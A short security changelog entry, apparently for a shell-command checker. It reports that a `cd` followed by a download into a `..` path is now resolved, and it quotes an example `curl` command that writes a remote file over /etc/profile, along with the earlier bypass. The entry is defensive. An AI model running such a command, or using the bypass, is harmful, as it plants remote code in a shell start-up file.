### Security
- A download or redirect that climbs out of a folder with `..` after a `cd` is now read from the folder it lands in. Before, `cd /srv && curl -o ../etc/profile https://example.com/x` was checked as the text `/srv/../etc/profile` and passed the shell start-up file rule; it is now refused like `curl -o /etc/profile`. The Node.js and Python engines behave the same.
